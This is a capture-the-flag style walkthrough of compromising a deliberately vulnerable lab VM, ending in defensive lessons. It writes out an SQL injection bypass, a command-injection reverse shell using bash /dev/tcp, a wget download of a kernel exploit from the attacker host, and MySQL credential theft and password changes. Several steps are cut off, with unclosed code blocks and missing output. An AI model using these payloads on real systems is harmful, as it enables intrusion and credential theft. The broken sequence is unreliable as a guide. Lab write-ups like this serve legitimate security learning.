I started out by finding the IP address of the target's machine. This can be done with ``netdiscover``, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.


```bash
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

```

I then ran an nmap scan against the target's IP address 192.168.56.108 to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I saved the output in a file because donâ€™t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

Since the target machine had an Apache web server running on port 80 and 443, I gave that a look and found the following web page:

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix11_loginform.png)

The first thing that came to mind when seeing a login form like this one was SQL injection. Entering 1'or'1'='1 in both fields showed this partcular form's susceptibility to SQL injection as I was given access to an application that pings other machines:

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix11_console.png)

I decided to check how well this application sanitizes user input in the field where an IP address is supposed to be entered. Instead of just entering an IP address to ping, I added something extra: `192.168.56.102;ls`. The `;` indicated that a new, unrelated command will follow (in this case I chose `ls`). This resulted in the following:

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix11_ls.png)

This means the application is vulnerable to command injection and I can execute commands directly on the target machine through this application. I then tried using this point of entry to give myself a reverse shell on the target machine:

```bash
kali@kali:~$ nc -nlvp 7777
```

Enter the following input in the vulnerable web application: `192.168.56.102;bash -i >& /dev/tcp/192.168.56.102/7777>&1`.

The result was low privilege access:

```sh
kali@kali:~$ nc -nlvp 7777

I tried using `uname -a` on the target machine for version info, but I couldn't initiatelly find any exploits that worked with the information this gave me. I also checked the specific CentOS version with `ls /etc/*release*` and `cat /etc/redhat-release`, but both exploits found for this particular version didn't seem to work and the source code doesn't help much in figuring out why.

After seemingly running out of exploits to run, I decided to give the original list of kernel-based exploits a more thorough try rather than picking a few and moving on afterwards. Fortunately, this paid off with `9545.c`:

```sh
sh-3.00$ wget http://192.168.56.102:7777/9545.c

## Storing passwords

It's worth mentioning a few other things I found after the command injection in the web application. Specifically, when I injected `ls` it listed the contents of the current directory on the target machine. That was `var/www/html`, which listed 2 files: `index.php` and `pingit.php`. Reading these files in a non-html environment (so from an actual shell on the target instead of from the web application), the following piece of code is found:

```sh
sh-3.00$ cat index.php
<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");

        if ($_POST['uname'] != ""){
                $username = $_POST['uname'];
                $password = $_POST['psw'];
                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
                //print $query."<br>";
                $result = mysql_query($query);

                $row = mysql_fetch_array($result);
                //print "ID: ".$row['id']."<br />";
        }                                                                                                                                                                      

?>
```

It looks like the web application uses the username `john` and the password `hiroshima` to locally connect to MySQL. These credentials work:

```sh
sh-3.00$ mysql -ujohn -phiroshima -e "show databases;"
Database
mysql
test
webapp
```

After using this to find additional useful information, I came across the following:

```sh
sh-3.00$ mysql -ujohn -phiroshima -e "show databases; use webapp; select * from users;"
Database
mysql
test
webapp
id      username        password
1       admin   5afac8d85f
2       john    66lajGGbla
```

The credentials for john didn't seem to redirect to the web application (but they didn't lock me out at the login form either), perhaps something to do with privileges for that particular user. The credentials for admin did work.

I also found the following:

```sh
sh-3.00$ mysql -ujohn -phiroshima -e "use mysql; select * from user;"

localhost       john    5a6914ba69e02807        Y       Y       Y       Y       N       N       N       N       N       N       N       N       N       N       N       N     NN       N       N       N                                       0       0       0
```

This indicates that the hashes for both the `john` and `root` user are the same, meaning they're using the same password (hiroshima). I tried it out and `root` did in fact use the same password, giving me full access to MySQL:

```sh
sh-3.00$ mysql -uroot -phiroshima -e "show databases;"
Database
mysql
test
webapp
```

With root access I could easily change current credentials, add new ones, etc.:

```sh
sh-3.00$ mysql -uroot -phiroshima -e "use mysql; update user set password = password('test123') where user = 'john';"
sh-3.00$ mysql -uroot -phiroshima -e "flush privileges;"
sh-3.00$ mysql -ujohn -phiroshima -e "show databases;"
ERROR 1045 (28000): Access denied for user 'john'@'localhost' (using password: YES)
sh-3.00$ mysql -ujohn -ptest123 -e "show databases;"
Database
mysql
test
webapp
```

## Lessons learned

I gained low privilege access to the target machine using a vulnerability in the web application's login form hosted on the target. This vulnerability allowed me to inject SQL code, bypassing all user credential checks. From there I used a second vulnerability in the web application (specifically in `pingit.php`), where I was able to inject and execute arbitrary commands into the target machine. Both of these vulnerabilities could've been prevented by properly validating/sanitizing user input and using stored procedures.

After that, gaining root access relied on exploiting outdated kernel and CentOS versions. This could've been prevented by regularly carrying out version updates.

Finally, the way I was able to gain complete control of the MySQL service running on the target machine relied on 1) the way the passwords for this service were stored and 2) the reuse of passwords. Passwords should not be stored in plaintext but should be secured with at the very least a strong hashing algorithm. You should also never reuse passwords for multiple accounts - keep them unique.
